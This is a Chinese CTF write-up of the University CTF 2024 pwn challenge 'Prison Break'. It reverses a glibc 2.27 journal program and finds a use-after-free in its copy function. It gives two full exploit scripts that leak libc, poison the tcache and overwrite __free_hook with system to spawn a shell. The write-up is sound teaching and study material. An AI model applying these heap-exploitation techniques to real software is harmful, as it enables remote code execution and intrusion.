# University CTF 2024 pwn- Prison Break-先知社区

> **来源**: https://xz.aliyun.com/news/17022  
> **文章ID**: 17022

---

## 前言

university-ctf-2024的一个pwn题目，考察对tcachebin 链表的理解，以及和题目功能函数的理解的结合，如果不能很好的明白这个结合，情况就会变得复杂起来

## 题目情况

Day 1077: In this cell, the days blur together. Journaling is the only thing keeping me sane. They are not aware that between the lines, I am planning my great escape.

```

    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc'
```

```
Prison Break ➤ strings glibc/libc.so.6 | grep "Ubuntu GLIBC"
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
```

## 逆向分析

```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int n4; // eax

  setup(argc, argv, envp);
  banner();
  while ( 1 )
  {
    while ( 1 )
    {
      n4 = menu();
      if ( n4 != 4 )
        break;
      copy_paste();
    }
    if ( n4 > 4 )
    {
LABEL_12:
      error("Invalid option");
    }
    else
    {
      switch ( n4 )
      {
        case 3:
          view();                               // 打印day和内容，会检查结构是否为0，isUsed是否是0
          break;
        case 1:
          create();                             // 创建结构,申请内存，填写内容，大小可控
                                                // 无溢出
          break;
        case 2:
          delete();                             // 释放结构里的内存
          break;
        default:
          goto LABEL_12;
      }
    }
  }
}
```

### create:

申请一个结构，：

```
00000000 stru1           struc ; (sizeof=0x18, mappedto_8)
00000000 ptr             dq ?
00000008 size            dq ?
00000010 isUsed          dd ?
00000014 day             dd ?
00000018 stru1           ends
```

其中isUsed标识是否使用

```
unsigned __int64 create()
{
  int _; // eax
  void *ptr; // rax
  unsigned int index; // [rsp+Ch] [rbp-14h] BYREF
  stru1 *new_stru1; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("Journal index:");
  index = 0;
  __isoc99_scanf("%d", &index);
  if ( index < 0xA )                            // 10个
  {
    if ( Chunks[index] && LOBYTE(Chunks[index]->isUsed) )
    {
      error("Journal index occupied");
    }
    else
    {
      new_stru1 = (stru1 *)malloc(0x18uLL);
      _ = day++;                                // 从0x435开始
      new_stru1->day = _;
      puts("Journal size:");
      __isoc99_scanf("%lu", &new_stru1->size);
      ptr = malloc(new_stru1->size);
      new_stru1->ptr = (__int64)ptr;
      LOBYTE(new_stru1->isUsed) = 1;
      if ( !new_stru1->ptr )
      {
        error("Could not allocate space for journal");
        exit(-1);
      }
      puts("Enter your data:");
      read(0, (void *)new_stru1->ptr, new_stru1->size);
      Chunks[index] = new_stru1;
      putchar(10);
    }
  }
  else
  {
    error("Journal index out of range");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

### delete:

不释放stru1结构体，只释放了结构体中的指针

```
unsigned __int64 delete()
{
  unsigned int index; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Journal index:");
  index = 0;
  __isoc99_scanf("%d", &index);
  if ( index < 0xA )
  {
    if ( Chunks[index] && LOBYTE(Chunks[index]->isUsed) )
    {
      LOBYTE(Chunks[index]->isUsed) = 0;
      free((void *)Chunks[index]->ptr);         // 没有清空指针
    }
    else
    {
      error("Journal is not inuse");
    }
  }
  else
  {
    error("Journal index out of range");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

### view:

只打印可用的结构体中指针指向的数据

```
unsigned __int64 view()
{
  unsigned int index; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Journal index:");
  index = 0;
  __isoc99_scanf("%d", &index);
  if ( index < 0xA )
  {
    if ( !Chunks[index] )
      error("Journal index does not exist");
    if ( LOBYTE(Chunks[index]->isUsed) != 1 )
      error("Journal is not inuse");
    else
      printf(
        "Day #%s%u%s entry:
%s
",
        "\x1B[1;31m",
        (unsigned int)Chunks[index]->day,
        "\x1B[1;97m",
        (const char *)Chunks[index]->ptr);
  }
  else
  {
    error("Journal index out of range");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

### copy\_paste:

复制1个结构体指针的内容到另一个结构体指针，只需要其中一个结构体可用就行，这里出了问题

```
unsigned __int64 copy_paste()
{
  unsigned int index; // [rsp+0h] [rbp-10h] BYREF
  unsigned int index2; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  index = 0;
  index2 = 0;
  puts("Copy index:");
  __isoc99_scanf("%d", &index);
  if ( index >= 0xA || (puts("Paste index:"), __isoc99_scanf("%d", &index2), index2 >= 0xA) )
  {
    error("Index out of range");
  }
  else if ( Chunks[index] && Chunks[index2] )
  {
    if ( LOBYTE(Chunks[index]->isUsed) || LOBYTE(Chunks[index2]->isUsed) )// 可以把使用中的，赋值给非使用中的
    {
      if ( Chunks[index]->size <= (unsigned __int64)Chunks[index2]->size )
      {
        Chunks[index2]->day = day;
        memcpy((void *)Chunks[index2]->ptr, (const void *)Chunks[index]->ptr, Chunks[index]->size);
        puts("Copy successfull!
");
      }
      else
      {
        error("Copy index size cannot be larger than the paste index size");
      }
    }
    else
    {
      error("Journal index not in use");
    }
  }
  else
  {
    error("Invalid copy/paste index");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

## 利用分析

每一次申请内存，都会申请一个结构体stru，结构体里标识可用于否，以及可控大小申请内存的指针

而复制操作，只需要有一边结构体是可用的即可

这意味着，释放了指针的结构是可以将释放后的指针的内容复制给正常的结构里，从而完成泄露内存（libc地址）

也意味着，当我们多次申请内存之后再释放内存，形成的内存链表，是可以通过复制操作来控制的

### 辅助函数：

```
def cmd(i, prompt=b"# "):
    sla(prompt, i)

def add(idx:int,size:int,content:bytes):
    cmd('1')
    sla(b"index:",str(idx).encode())
    sla(b"size:",str(size).encode())
    sla(b"data:",content)
    #......

def remove(idx:int):
    cmd('2')
    sla(b"index:",str(idx).encode())
    #......

def show(idx:int):
    cmd('3')
    sla(b"index:",str(idx).encode())
    #......

def copy(idx1:int,idx2:int):
    cmd('4')
    sla(b"index:",str(idx1).encode())
    sla(b"index:",str(idx2).encode())
    #......

```

### 利用过程 - 泄露 libc 地址

申请多个，0x80的chunk，然后释放掉8个（1-8），这时有chunk8进入unsortedbin

```
for i in range(10):
    add(i,0x88,b"")
for i in range(1,9):
    remove(i)
```

此时的bins：

```
pwndbg> bins
tcachebins
0x90 [  7]: 0x557d00172750 —▸ 0x557d001726a0 —▸ 0x557d001725f0 —▸ 0x557d00172540 —▸ 0x557d00172490 —▸ 0x557d001723e0 —▸ 0x557d00172330 ◂— 0
fastbins
empty
unsortedbin
all: 0x557d001727f0 —▸ 0x7f714ea78ca0 (main_arena+96) ◂— 0x557d001727f0
smallbins
empty
largebins
empty
```

复制进入unsortedbin 的chunk8的内容到未释放的chunk0里，泄露处libc地址：

```
copy(8,0)
show(0)
ru(b"entry:
")
leak = r(6)
leak = unpack(leak,"all")
success(f"leak: {hex(leak)}")
libc.address = leak -0x3ebca0
log_libc_base_addr(libc.address)
```

此时的内存，可用的stru结构体指向的内容就是unsortedbin chunk的：

```
0x557d00172250  0x0000000000000000      0x0000000000000021      ........!.......
0x557d00172260  0x0000557d00172280      0x0000000000000088      ."..}U..........
0x557d00172270  0x0000043f00000001      0x0000000000000091      ....?...........		// <- 可用stru
0x557d00172280  0x00007f714ea78ca0      0x00007f714ea78ca0      ...Nq......Nq...		// <- 内容被复制替换成unsortedbin chunk的内容了，泄露libc地址
0x557d00172290  0x0000000000000000      0x0000000000000000      ................
0x557d001722a0  0x0000000000000000      0x0000000000000000      ................
0x557d001722b0  0x0000000000000000      0x0000000000000000      ................
0x557d001722c0  0x0000000000000000      0x0000000000000000      ................
0x557d001722d0  0x0000000000000000      0x0000000000000000      ................
0x557d001722e0  0x0000000000000000      0x0000000000000000      ................
0x557d001722f0  0x0000000000000000      0x0000000000000000      ................
0x557d00172300  0x0000000000000090      0x0000000000000021      ........!.......

```

### 利用过程 - 劫持 free hook

申请1个0x70的chunk（不是0x80就行），内容写入free hook的地址，复制该地址到chunk7（tcache链表的末尾）里

```
add(1, 0x70, pack(libc.sym.__free_hook))
copy(1, 7)
```

从而劫持链表：

```
pwndbg> bins
tcachebins
0x90 [  7]: 0x557d00172750 —▸ 0x7f714ea7a8e8 (__free_hook) ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
0x70: 0x557d00172810 —▸ 0x7f714ea78d00 (main_arena+192) ◂— 0x557d00172810
largebins
empty
```

然后就是常规的申请内存劫持free hook，释放内存触发system了

```
add(2, 0x88,b"/bin/sh\x00")
add(3, 0x80,pack(libc.sym.system))
remove(2)
```

## 完整exp

```
#!/usr/bin/env python3
from pwncli import *
cli_script()

#context.log_level = "info"
io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

def cmd(i, prompt=b"# "):
    sla(prompt, i)

def add(idx:int,size:int,content:bytes):
    cmd('1')
    sla(b"index:",str(idx).encode())
    sla(b"size:",str(size).encode())
    sla(b"data:",content)
    #......

def remove(idx:int):
    cmd('2')
    sla(b"index:",str(idx).encode())
    #......

def show(idx:int):
    cmd('3')
    sla(b"index:",str(idx).encode())
    #......

def copy(idx1:int,idx2:int):
    cmd('4')
    sla(b"index:",str(idx1).encode())
    sla(b"index:",str(idx2).encode())
    #......

for i in range(10):
    add(i,0x88,b"")
for i in range(1,9):
    remove(i)


copy(8,0)
show(0)
ru(b"entry:
")
leak = r(6)
leak = unpack(leak,"all")
success(f"leak: {hex(leak)}")
libc.address = leak -0x3ebca0
log_libc_base_addr(libc.address)


add(1, 0x70, pack(libc.sym.__free_hook))
copy(1, 7)

add(2, 0x88,b"/bin/sh\x00")
add(3, 0x80,pack(libc.sym.system))
remove(2)

ia()
```

## 总结

这个题目的关键在于理解copy操作的意义，就是可控释放后的chunk，可以用来泄露数据，也可以用来劫持链表

第一次做的时候，我光想着要如何连续释放2次同一个内存，来打tcache dup，后来通过篡改某个结构的指针，使其指向free hook的地址然后通过copy向free hook赋值，相比之下，属实笨重了很多，算是个非预期解吧，exp附在下面了

## 非预期解 exp，劫持自定义结构指针覆写free hook

```
#!/usr/bin/env python3
from pwncli import *
cli_script()

context.log_level = "info"
io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

def cmd(i, prompt=b"# "):
    sla(prompt, i)

def add(idx:int,size:int,content:bytes):
    cmd('1')
    sla(b"index:",str(idx).encode())
    sla(b"size:",str(size).encode())
    sla(b"data:",content)
    #......

def remove(idx:int):
    cmd('2')
    sla(b"index:",str(idx).encode())
    #......

def show(idx:int):
    cmd('3')
    sla(b"index:",str(idx).encode())
    #......

def copy(idx1:int,idx2:int):
    cmd('4')
    sla(b"index:",str(idx1).encode())
    sla(b"index:",str(idx2).encode())
    #......


add(0,0x520,b"0")
add(1,0x520,b"1")
add(2,0x18,b"2")
remove(0)
remove(1)
remove(2)

add(3,0x8,b"3333333")
show(3)
ru(b"3333333
")
leak = r(6)
leak = unpack(leak,"all")
success(f"leak: {hex(leak)}")
heap = leak >> 12 << 12

remove(3)
add(4,0x1,b"")
show(4)
ru(b"entry:
")
leak = r(6)
leak = unpack(leak,"all")
libc.address = leak - 0x3ebc0a
log_heap_base_addr(heap)
log_libc_base_addr(libc.address)

remove(4)

add(0,0x18,b"0")
remove(0)
add(1,0x18,b"1")
remove(1)
add(2,0x18,b"2")
remove(2)
add(3,0x18,b"3")
add(4,0x18,b"4")
remove(4)
remove(3)
add(5,0x18,pack(heap + 0x830) + pack(0x18) + p32(1))
copy(5,0)

remove(1)
add(6,0x18,pack(libc.sym.__free_hook) + pack(0x18) + p32(1))
copy(2,0)
add(7,0x18,pack(libc.sym.system) + pack(0x18) + p32(1))
copy(7,1)

add(8,0x18,b"/bin/sh\x00")
remove(8)
ia()

```

## 参考资料

* [0] [Hack The Box :: Hack The Box](https://app.hackthebox.com/challenges/Prison%20Break)
